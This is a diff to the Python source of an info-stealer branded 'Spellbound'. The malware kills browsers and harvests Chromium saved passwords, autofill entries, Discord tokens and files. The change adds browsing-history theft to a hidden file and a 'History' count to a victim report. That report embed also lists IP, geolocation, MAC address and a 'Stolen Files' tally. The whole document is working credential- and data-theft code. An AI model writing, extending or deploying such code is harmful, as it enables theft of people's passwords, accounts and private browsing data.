@@ -248,10 +248,12 @@ except Exception as e:
 # ============================================================================================= CHROMIUM ============================================================================================================= #
 __CHROMIUM_PASSWORDS__ = []
 __CHROMIUM_AUTOFILLS__ = []
+__CHROMIUM_HISTORY__ = []
 chromiumBrowsers = [{"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},{"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},{"name": "Opera", "path": os.path.join(ROAMING, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},{"name": "Opera GX", "path": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},{"name": "Yandex", "path": os.path.join(ROAMING, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},]
 chromiumSubpaths = [{"name": "None", "path": ""},{"name": "Default", "path": "Default"},{"name": "Profile 1", "path": "Profile 1"},{"name": "Profile 2", "path": "Profile 2"},{"name": "Profile 3", "path": "Profile 3"},{"name": "Profile 4", "path": "Profile 4"},{"name": "Profile 5", "path": "Profile 5"},]
 totalPasswords = 0
 totalAutofills = 0
+totalHistory = 0
 
 def DecryptData(data, key):
     try:
@@ -355,43 +357,57 @@ def GrabPasswordChromium():
 
 def GrabAutofillChromium():
     for browser in chromiumBrowsers:
-            KillProcess(browser["name"])
-            browser_path = browser["path"]
-            if not os.path.exists(browser_path):
-                continue
+        KillProcess(browser["name"])
+        browser_path = browser["path"]
+        if not os.path.exists(browser_path):
+            continue
 
-            for profile in chromiumSubpaths:
-                profile_path = os.path.join(browser_path, profile["path"])
-                web_data_path = os.path.join(profile_path, "Web Data")
+        for profile in chromiumSubpaths:
+            profile_path = os.path.join(browser_path, profile["path"])
+            web_data_path = os.path.join(profile_path, "Web Data")
 
-                if os.path.exists(web_data_path):
-                    temp_copy = web_data_path + "_temp"
-                    shutil.copy2(web_data_path, temp_copy)
+            if os.path.exists(web_data_path):
+                temp_copy = web_data_path + "_temp"
+                shutil.copy2(web_data_path, temp_copy)
 
-                    try:
-                        conn = sqlite3.connect(temp_copy)
-                        cursor = conn.cursor()
+                try:
+                    conn = sqlite3.connect(temp_copy)
+                    cursor = conn.cursor()
 
-                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
-                        tables = [table[0] for table in cursor.fetchall()]
-                        if "autofill" in tables:
-                            cursor.execute("SELECT name, value FROM autofill")
-                            autofills = cursor.fetchall()
+                    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+                    tables = [table[0] for table in cursor.fetchall()]
+                    if "autofill" in tables:
+                        cursor.execute("SELECT name, value FROM autofill")
+                        autofills = cursor.fetchall()
 
-                            for autofill in autofills:
-                                autofill_entry = (
-                                    f'Name: {autofill[0]}\n'
-                                    f'Value: {autofill[1]}\n'
-                                    f"Browser: {browser['name']}\n"
-                                    '==============\n'
-                                )
-                                __CHROMIUM_AUTOFILLS__.append(autofill_entry)
+                        for autofill in autofills:
+                            autofill_entry = (
+                                f'Name: {autofill[0]}\n'
+                                f'Value: {autofill[1]}\n'
+                                f"Browser: {browser['name']}\n"
+                                '==============\n'
+                            )
+                            __CHROMIUM_AUTOFILLS__.append(autofill_entry)
 
-                        conn.close()
-                    except sqlite3.Error as e:
-                        pass
-                    finally:
-                        os.remove(temp_copy)
+                    conn.close()
+                except sqlite3.Error as e:
+                    pass
+                finally:
+                    os.remove(temp_copy)
+
+def GrabHistoryChromium():
+    for browser in chromiumBrowsers:
+        KillProcess(browser["name"])
+        history_path = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/History"
+        conn = sqlite3.connect(history_path)
+        cursor = conn.cursor()
+        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
+        rows = cursor.fetchall()
+        conn.close()
+        for row in rows:
+            url = row[0]
+            title = row[1]
+            __CHROMIUM_HISTORY__.append((url, title))
 
 try:
     GrabPasswordChromium()
@@ -421,6 +437,17 @@ try:
             totalAutofills += 1
 except Exception as e:
     log.error(f"Unexpected error - Chromium - Autofills : {e}")
+
+try:
+    GrabHistoryChromium()
+
+    with open(f"{CHROMIUM_FOLDER_PATH}\\.history.txt", "w", encoding="utf-8") as writer:
+        writer.write(FILE_HEADER)
+        for autofill in __CHROMIUM_HISTORY__:
+            writer.write(autofill)
+            totalHistory += 1
+except Exception as e:
+    log.error(f"Unexpected error - Chromium - History : {e}")
 
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
@@ -488,7 +515,7 @@ embed = {
     "color": 0,
     "fields": [
         {"name": ":computer: __System Infos__", "value": f"```ansi\n[2;45m[0m[2;45m[0m[2;35mSession[0m : {session}\n[2;45m[0m[2;45m[0m[2;35mComputer Name[0m : {computer_name}\n[2;45m[0m[2;45m[0m[2;35mOS[0m : {osVersion}\n[2;45m[0m[2;45m[0m[2;35mArchitecture[0m : {architecture}\n[2;45m[0m[2;45m[0m[2;35mMAC[0m : {mac}\n[2;45m[0m[2;45m[0m[2;35mIP[0m : {ip}\n[2;45m[0m[2;45m[0m[2;35mCountry[0m : {country}\n[2;45m[0m[2;45m[0m[2;35mRegion[0m : {region}\n[2;45m[0m[2;45m[0m[2;35mCity[0m : {city}\n[2;45m[0m[2;45m[0m[2;35mLocalisation[0m : {loc}\n[2;45m[0m[2;45m[0m[2;35mInternet Provider[0m : {org}```", "inline": False},
-        {"name": ":identification_card: __User Infos__", "value": f"```ansi\n[2;34mDiscord Account[0m : {totalDiscordTokens}\n[2;34mPasswords[0m : {totalPasswords}\n[2;34mAuto-fills[0m : {totalAutofills}\n[2;34mStolen Files[0m : {totalFiles}```", "inline": False},
+        {"name": ":identification_card: __User Infos__", "value": f"```ansi\n[2;34mDiscord Account[0m : {totalDiscordTokens}\n[2;34mPasswords[0m : {totalPasswords}\n[2;34mAuto-fills[0m : {totalAutofills}\n[2;34mHistory[0m : {totalHistory}\n[2;34mStolen Files[0m : {totalFiles}```", "inline": False},
     ],
     "footer": {"text": "Grabbed by Spellbound"}
 }
